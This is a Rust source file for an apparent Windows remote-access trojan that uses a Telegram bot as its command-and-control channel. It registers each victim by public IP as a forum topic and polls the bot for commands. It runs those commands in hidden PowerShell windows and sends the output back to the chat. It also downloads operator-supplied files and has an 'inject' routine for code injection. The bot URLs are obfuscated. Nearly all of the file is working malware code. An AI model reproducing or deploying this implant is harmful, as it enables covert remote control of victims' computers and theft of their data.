pub mod api;
pub mod model;
pub mod functions;

use crate::api::*;
use crate::functions::info_collect_use::*;
use crate::functions::tg_until::tg_tools;
use regex::Regex;
use reqwest;
use serde_json::{Value, json};
use shell_words;
use std::os::windows::process::CommandExt;
use std::{
    fs::{self, File},
    io::{Read, Write},
    path::Path,
    process::{Command, Stdio},
};
use tokio::time::{Duration, sleep};



pub fn wechat_list() {}


fn extract_file_id_from_topic(json_str: &str, thread_id: i64) -> Option<(String,i64)> {
    // 解析 JSON
    let v: Value = match serde_json::from_str(json_str) {
        Ok(val) => val,
        Err(e) => {
            eprintln!("JSON 解析失败: {}", e);
            return None;
        }
    };

    // 获取 result 数组
    let result = v.get("result")?.as_array()?;

    // 从后往前遍历
    for item in result.iter().rev() {
        let msg = item.get("message")?;

        let is_topic = msg.get("is_topic_message")?.as_bool().unwrap_or(false);
        let mid = msg.get("message_thread_id")?.as_i64().unwrap_or(-1);

        if is_topic && mid == thread_id {
            // 检查是否是带 "inject" caption 的文件
            if let Some(document) = msg.get("document") {
                if let Some(caption) = msg.get("caption").and_then(|c| c.as_str()) {
                    if caption.eq_ignore_ascii_case("inject") {
                        if let Some(fid) = document.get("file_id").and_then(|f| f.as_str()) {
                            return Some((fid.to_string(), 0)); // 0表示inject文件
                        }
                    }
                }

                // 普通文件 → 提取 file_id
                if let Some(file_id) = document.get("file_id").and_then(|fid| fid.as_str()) {
                    return Some((file_id.to_string(),1)); // 1表示普通文件
                }
            }
        }
    }

    None
}



fn inject() {
    println!("inject function called");
}


fn extract_last_thread_id_with_ip(json_str: &str, target_ip: &str) -> Option<i64> {
    let v: serde_json::Value = serde_json::from_str(json_str).ok()?;
    let result = v.get("result")?.as_array()?;

    for item in result.iter().rev() {
        // 逆序查找最新条目
        let message = item.get("message")?;

        // 修正路径：message -> reply_to_message -> forum_topic_created
        if let Some(reply) = message.get("reply_to_message") {
            if let Some(topic) = reply.get("forum_topic_created") {
                if let Some(name) = topic.get("name").and_then(|n| n.as_str()) {
                    if name.contains(target_ip) {
                        // 增加类型校验
                        return message.get("message_thread_id").and_then(|id| id.as_i64());
                    }
                }
            }
        }
    }

    None
}

pub async fn topic_init() {
    let cert = reqwest::Certificate::from_pem(include_bytes!("my_root_ca.crt"))
        .expect("invalid certificate");
    // 获取公网 IP 地址
    // let client = reqwest::Client::new();
    let client = reqwest::Client::builder()
        .add_root_certificate(cert)
        .build()
        .expect("client build fail.");
    let ip_address = client
        .get("http://ipinfo.io/ip")
        .send()
        .await
        .expect("ip请求失败")
        .text()
        .await
        .expect("读取ip响应失败");

    println!("公网IP: {}", ip_address);

    // 获取 Telegram getUpdates 响应
    let response = client
        .get(decoded_url(UPDATE_URL.as_str()))
        .send()
        .await
        .expect("请求失败");

    let body = response.text().await.expect("读取Telegram响应失败");

    //println!("getUpdates 返回内容:\n{}", body);

    if body.contains(ip_address.trim()) {
        println!("IP 地址存在");
        // let json = serde_json::from_str::<serde_json::Value>(&body).expect("解析JSON失败");
        let message_thread_id = extract_last_thread_id_with_ip(&body, ip_address.trim())
            .expect("114:updates获取message_thread_id失败");
        println!("message_thread_id: {}", message_thread_id);
        // 测试topic是否可用
        if message_thread_id != 0 {
            {
                let mut ptr = MESSAGE_THREAD_ID.lock().unwrap();
                *ptr = message_thread_id as i64;
                println!("message_thread_id: {}", message_thread_id);
            }
            let payload = json!({
                "chat_id": CHAT_ID.as_str(),
                "message_thread_id": message_thread_id,
                "text": format!("IP: {}已连接", ip_address),
            });
            let response = client
                .post(decoded_url(SENDMSG_URL.as_str()))
                .header("Content-Type", "application/json")
                .json(&payload)
                .send()
                .await
                .expect("发送消息失败");
            if response.status().is_success() {
                println!("topic可用");

                return;
            } else {
                println!("topic不可用");
                {
                    let mut ptr = MESSAGE_THREAD_ID.lock().unwrap();
                    *ptr = 0;
                }
            }
        }
    }

    println!("IP/topic 不存在/不可用");
    // create_topic;
    let payload = json!({
        "chat_id": CHAT_ID.as_str(),
        "name": format!("IP: {}", ip_address),
    });
    println!("创建topic: {:?}", ip_address);
    let reponse = client
        .post(decoded_url(CREATEFORUMTOPIC_URL.as_str()))
        .header("Content-Type", "application/json")
        .json(&payload)
        .send()
        .await
        .expect("创建topic失败");
    let body1 = reponse.text().await.expect("读取创建topic响应失败");
    // println!("创建topic返回内容:\n{}", body);
    let json = serde_json::from_str::<serde_json::Value>(&body1).expect("解析创建topic JSON失败");
    let message_thread_id = json["result"]["message_thread_id"]
        .as_i64()
        .expect("创建后获取message_thread_id 失败");
    {
        let mut ptr = MESSAGE_THREAD_ID.lock().unwrap();
        *ptr = message_thread_id as i64;
    }
    // println!("message_thread_id: {}", message_thread_id);
}
// 解析 JSON 响应

fn extract_last_command_from_topic(json_str: &str, thread_id: i64) -> Option<(i64, String)> {
    // let mut update_id = current_update_id;
    // 反序列化 JSON 到 Value 结构
    let v: serde_json::Value = match serde_json::from_str(json_str) {
        Ok(val) => val,
        Err(e) => {
            eprintln!("JSON 解析失败: {}", e);
            return None;
        }
    };

    // 获取 result 数组
    let result = match v.get("result")?.as_array() {
        Some(arr) => arr,
        None => {
            eprintln!("result 字段不是数组类型");
            return None;
        }
    };

    // 反向遍历所有结果项
    for item in result.iter().rev() {
        // 获取 message 对象
        let msg = match item.get("message") {
            Some(m) => m,
            None => {
                eprintln!("message 字段缺失");
                continue;
            }
        };

        // 检查是否是 topic 消息
        let _ = match msg.get("is_topic_message")?.as_bool() {
            Some(b) => b,
            None => {
                eprintln!("is_topic_message 类型错误");
                continue;
            }
        };

        // 获取消息线程 ID
        let mid = match msg.get("message_thread_id")?.as_i64() {
            Some(id) => id,
            None => {
                eprintln!("message_thread_id 类型错误");
                continue;
            }
        };
        if mid != thread_id {
            continue;
        }

        // 提取 update_id（必须存在）
        let update_id = match item.get("update_id")?.as_i64() {
            Some(id) => id,
            None => {
                eprintln!("update_id 不存在或类型错误");
                continue;
            }
        };

        // 提取命令文本
        let text = match msg.get("text")?.as_str() {
            Some(t) => t.to_string(),
            None => {
                eprintln!("text 字段缺失或类型错误");
                continue;
            }
        };

        // 找到符合条件的第一个（即最后一个）记录立即返回
        println!(
            "找到符合条件的记录: update_id: {}, text: {}",
            update_id, text
        );
        return Some((update_id, text));
    }

    // 没有找到匹配项
    None
}

pub async fn command() {
    // 配置临时证书
    let cert = reqwest::Certificate::from_pem(include_bytes!("my_root_ca.crt"))
        .expect("invalid certificate");
    let mut last_command: String = String::new();
    let mut last_file_id: String = String::new();
    let mut last_inject_file_id: String = String::new(); // 新增：记录最后处理的inject文件ID
    let mut update_id = 0;
    let mut cmd: String = String::new();
    let client = reqwest::Client::builder()
        .add_root_certificate(cert)
        .build()
        .expect("client build fail.");
    let sleep_time: u64;
    {
        sleep_time = *SLEEP_TIME.lock().unwrap();
    }
    // 使用外部变量接住
    let thread_id: i64;
    {
        let message_thread_id = MESSAGE_THREAD_ID.lock().unwrap();
        thread_id = *message_thread_id;
    }
    
    loop {
        let mut temp_cmd_flag = true;
        let mut temp_file_flag = false;
        let mut should_execute_cmd = false; // 新增：标记是否需要执行命令
        print!("loop---{update_id}----\n");
        sleep(Duration::from_secs(sleep_time)).await;

        let response = loop {
            match client
                .get(decoded_url(UPDATE_URL.as_str()))
                .query(&[("offset", update_id.to_string())])
                .send()
                .await
            {
                Ok(resp) => break resp,
                Err(e) => {
                    eprintln!("command中updates请求失败: {e}，正在重试...");
                    sleep(Duration::from_secs(30)).await;
                }
            }
        };

        let body = response.text().await.expect("请求text失败");

        // 首先处理命令
        let result = extract_last_command_from_topic(&body, thread_id);
        match result {
            Some((temp_update_id, temp_cmd)) => {
                if update_id == temp_update_id {
                    temp_cmd_flag = false;
                } else if last_command == temp_cmd {
                    // 如果命令未变化，则跳过
                    println!("命令未变化");
                    temp_cmd_flag = false;
                } else {
                    last_command = temp_cmd.to_string();
                    println!("last_command:{}", last_command);
                    cmd = temp_cmd.to_string();
                    println!("命令变化");
                    println!("update_id: {}", temp_update_id);
                    update_id = temp_update_id;

                    let is_cmd = Regex::new(r"^/").expect("is_cmd parttern fail");
                    if is_cmd.is_match(cmd.as_str()) {
                        // 处理bot命令
                        crate::functions::match_command::match_command(&cmd,update_id).await;
                        temp_cmd_flag = false; // bot命令已处理，不需要再执行
                    } else {
                        // 系统命令，标记需要执行
                        should_execute_cmd = true;
                    }
                }
            }
            None => {
                println!("没有找到符合条件的命令");
                temp_cmd_flag = false;
            }
        }

        // 然后处理文件下载
        match extract_file_id_from_topic(&body, thread_id) {
            Some((file_id, file_type)) => {
                if file_type == 0 {
                    // inject文件处理
                    if last_inject_file_id == file_id {
                        println!("inject文件ID未变化，跳过处理");
                        temp_file_flag = false;
                    } else {
                        println!("检测到新的inject文件: {}", file_id);
                        last_inject_file_id = file_id.clone();
                        temp_file_flag = true;
                        
                        // 执行inject逻辑
                        inject();
                        let _ = crate::functions::inject_self::inject_self_packet(&file_id, &client).await;
                        println!("inject文件处理完成");
                    }
                } else {
                    // 普通文件处理
                    if last_file_id == file_id {
                        println!("下载文件ID未变化");
                        temp_file_flag = false;
                    } else {
                        last_file_id = file_id.clone();
                        temp_file_flag = true;
                        
                        println!("last_file_id:{}", last_file_id);

                        let (download_url, file_path) = tg_tools::file_id_to_download_url(file_id, &client).await;

                        // 下载文件
                        let response = client.get(download_url).send().await.expect("下载文件失败");

                        let save_path = format!(
                            "{}/{}",
                            OUTPUT_DIR.as_str(),
                            file_path.split("/").last().expect("创建文件名失败")
                        );
                        let mut file = fs::File::create(&save_path).expect("创建文件失败");
                        let content = response.bytes().await.expect("读取文件内容失败");
                        file.write_all(&content).expect("写入文件失败");
                        println!("文件下载成功: {}", save_path);
                        
                        // 发送下载成功消息
                        let _ = tg_tools::sendmessage(
                            format!("文件下载成功: {}", save_path).as_str(),
                        );
                    }
                }
            }
            None => {
                println!("没有找到符合条件的文件");
                temp_file_flag = false;
            }
        }

        // 如果命令和文件都未变化，则跳过
        if !temp_cmd_flag && !temp_file_flag {
            println!("命令和文件都未变化");
            continue;
        }

        // 只有在明确需要执行命令时才执行系统命令
        if should_execute_cmd && !cmd.is_empty() && !cmd.starts_with('/') {
            println!("执行系统命令: {}", cmd);
            
            let args = shell_words::split(cmd.as_str())
                .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidInput, e))
                .expect("word split error");

            async fn run_command(args: Vec<String>, thread_id: i64, client: reqwest::Client) {
                let result = Command::new("powershell")
                    .args(["-Command"])
                    .args(["[Console]::OutputEncoding = [Text.UTF8Encoding]::UTF8;"])
                    .args(args)
                    .creation_flags(0x08000000) // #debug hide windows
                    .stdin(Stdio::null())
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped())
                    .output()
                    .expect("执行失败");
                let content = format!("{}{}\n", String::from_utf8_lossy(&result.stdout), String::from_utf8_lossy(&result.stderr));
                let max_len = 4096;
                if content.len() > max_len {
                    let mut start = 0;
                    let chars: Vec<char> = content.chars().collect();
                    while start < chars.len() {
                        let end = usize::min(start + max_len, chars.len());
                        let chunk: String = chars[start..end].iter().collect();
                        let payload = json!({
                            "message_thread_id": thread_id,
                            "chat_id": CHAT_ID.as_str(),
                            "text": chunk,
                        });
                        println!("{}", serde_json::to_string_pretty(&payload).unwrap());
                        let _ = client
                            .post(decoded_url(SENDMSG_URL.as_str()))
                            .header("Content-Type", "application/json")
                            .json(&payload)
                            .send()
                            .await
                            .expect("发送消息失败");
                        start = end;
                    }
                } else {
                    let payload = json!({
                        "message_thread_id": thread_id,
                        "chat_id": CHAT_ID.as_str(),
                        "text": content,
                    });
                    println!("{}", serde_json::to_string_pretty(&payload).unwrap());
                    let _ = client
                        .post(decoded_url(SENDMSG_URL.as_str()))
                        .header("Content-Type", "application/json")
                        .json(&payload)
                        .send()
                        .await
                        .expect("发送消息失败");
                }
            }
            
            let cl = client.clone();
            tokio::spawn(async move {
                run_command(args, thread_id, cl).await;
            });
            
            // 命令执行完成后，重置标记
            should_execute_cmd = false;
        }
    }
}


